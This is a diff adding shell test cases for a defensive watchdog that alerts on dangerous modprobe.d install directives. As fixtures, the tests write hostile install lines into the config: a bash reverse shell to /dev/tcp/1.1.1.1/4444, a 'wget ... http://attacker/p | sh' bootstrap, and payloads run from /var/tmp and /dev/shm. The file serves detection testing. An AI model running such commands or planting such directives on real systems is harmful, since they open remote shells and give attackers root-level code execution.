@@ -162,3 +162,67 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     [ "${status}" -ne 0 ]
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — modprobe-config inventory enumerates module-autoload-trigger root-exec surface)" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (install command under /var/tmp): writable-root expansion" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    printf 'install evilmod /var/tmp/payload\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (install command under /dev/shm): tmpfs writable-root coverage" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    printf 'install evilmod /dev/shm/payload\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (install command with reverse-shell pattern): /dev/tcp → alert" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    printf 'install evilmod /bin/bash -c "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (install command with wget-pipe-sh): wget bootstrap" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    printf 'install evilmod /bin/sh -c "wget -qO- http://attacker/p | sh"\n' > "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (current-behavior lock — modprobe-config-watchdog scans CONTENT, not the file's own perms; file-mode is owned by world-writable-watchdog)" {
+    # Documented architectural boundary: this watchdog focuses on install
+    # directive CONTENT (exec-capable install commands). File-mode coverage
+    # lives in world-writable-watchdog / suid-sgid-watchdog. A world-
+    # writable modprobe.d conf with benign content does NOT fire here.
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    chmod 0666 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    # Lock that content-delta path: no install change → no exec-install
+    # event from THIS watchdog.
+    ! cap | grep -q '"event":"modprobe_config_exec_install"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf 'install pcspkr /bin/true\n' > "${CONF}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-modprobe-config -- ')
+    [ "${main_count}" = "1" ]
+}
